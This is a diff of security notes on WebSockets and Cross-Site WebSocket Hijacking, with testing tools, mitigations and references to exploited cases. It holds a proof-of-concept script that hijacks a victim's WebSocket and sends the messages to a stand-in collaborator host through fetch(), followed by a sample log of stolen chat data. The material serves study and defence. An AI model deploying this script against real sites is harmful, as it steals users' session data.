@@ -1,3 +1,9 @@
+---
+aliases:
+  - CSWSH
+  - Cross-Site WebSocket Hijacking
+---
+
 >[!question] What are WebSockets?
 >WebSockets are a bi-directional, full duplex communications protocol initiated over HTTP. They are commonly used in modern web applications for streaming data and other asynchronous traffic.
 
@@ -10,7 +16,7 @@ WebSockets are particularly useful in situations where low-latency or server-ini
 >[!tip] Tooling for testing WebSockets
 >- [SocketSleuth](https://github.com/snyk/socketsleuth/) [^note]
 
-[^note]:[Start free - SocketSleuth Improving Security Testing for WebSocket Applications  Snyk](../../Readwise/Articles/Start%20free%20-%20SocketSleuth%20Improving%20Security%20Testing%20for%20WebSocket%20Applications%20%20Snyk.md#^af3f13)
+[^note]:[Start free - SocketSleuth Improving Security Testing for WebSocket Applications Snyk](../../Readwise/Articles/Start%20free%20-%20SocketSleuth%20Improving%20Security%20Testing%20for%20WebSocket%20Applications%20Snyk.md#^af3f13)
 ## Establishing connections
 
 Protocols to open WebSocket:
@@ -64,22 +70,22 @@ In principle, practically any web security vulnerability might arise in relation
 
 
 >[!example]
->PoC hosted on the attacker server performing the CSRF and leaking the received information using ws:
->
->```html
-><script>
->    var ws = new WebSocket('wss://your-websocket-url');
->    ws.onopen = function() {
->        ws.send("READY");
->    };
->    ws.onmessage = function(event) {
->        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
->    };
-></script>
->```
->Data exfiltrated from the victim ws:
->```http
->...
+>PoC hosted on the attacker server performing the CSRF and leaking the received information using ws
+
+```html
+<script>
+    var ws = new WebSocket('wss://your-websocket-url');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
+```
+ Data exfiltrated from the victim ws:
+```http
+...
 10.0.4.85       2023-01-06 21:24:17 +0000 "GET /exploit/ HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"
 10.0.4.85       2023-01-06 21:24:18 +0000 "GET /log?a={%22user%22:%22Hal%20Pline%22,%22content%22:%22Hello,%20how%20can%20I%20help?%22} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"
 10.0.4.85       2023-01-06 21:24:18 +0000 "GET /log?a={%22user%22:%22You%22,%22content%22:%22I%20forgot%20my%20password%22} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"
@@ -87,10 +93,21 @@ In principle, practically any web security vulnerability might arise in relation
 10.0.4.85       2023-01-06 21:24:18 +0000 "GET /log?a={%22user%22:%22You%22,%22content%22:%22Thanks,%20I%20hope%20this%20doesn&apos;t%20come%20back%20to%20bite%20me!%22} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"
 10.0.4.85       2023-01-06 21:24:18 +0000 "GET /log?a={%22user%22:%22Hal%20Pline%22,%22content%22:%22No%20problem%20carlos,%20it&apos;s%20qhakj7ncjna6l17u20as%22} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"
 |...
->```
+```
 
-This vulnerability was used against Gitpod to leak environment data and obtain SSH keys, bypassing [SameSite attribute on cookies](Session%20Attacks%20and%20Session%20Prediction.md#SameSite%20attribute%20on%20cookies), finally escalating to RCE. [^gitpod]
-The same vulnerability was also used to get RCE against MeshCentral [^meshcentral-cswsh]
+This vulnerability was used against Gitpod to leak environment data and obtain SSH keys, bypassing [SameSite attribute on cookies](SameSite%20Cookie%20Attribute.md#SameSite%20101) , finally escalating to RCE. [^gitpod]
+The same vulnerability was also used to get RCE against MeshCentral [^meshcentral-cswsh].
+
+## Mitigations
+
+[Cross-Site WebSocket Hijacking Exploitation in 2025](../../Readwise/Articles/Laurence%20Tennant%20-%20Cross-Site%20WebSocket%20Hijacking%20Exploitation%20in%202025.md) is much harder then before.
+
+Three main [mitigations](../../Readwise/Articles/Laurence%20Tennant%20-%20Cross-Site%20WebSocket%20Hijacking%20Exploitation%20in%202025.md#Mitigations):
+- [SameSite=Lax by default](../../Readwise/Articles/Laurence%20Tennant%20-%20Cross-Site%20WebSocket%20Hijacking%20Exploitation%20in%202025.md#SameSite=Lax%20by%20default)
+- [Total Cookie Protection](../../Readwise/Articles/Laurence%20Tennant%20-%20Cross-Site%20WebSocket%20Hijacking%20Exploitation%20in%202025.md#Total%20Cookie%20Protection)
+- [Private Network Access](../../Readwise/Articles/Laurence%20Tennant%20-%20Cross-Site%20WebSocket%20Hijacking%20Exploitation%20in%202025.md#Private%20Network%20Access)
+
+
 
 [^gitpod]: [Gitpod remote code execution 0-day vulnerability via WebSockets](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/), snyk.io
 [^meshcentral-cswsh]: [MeshCentral Cross-Site Websocket Hijacking Vulnerability (CVE-2024-26135)](https://www.praetorian.com/blog/meshcentral-cross-site-websocket-hijacking-vulnerability/), praetorian.com
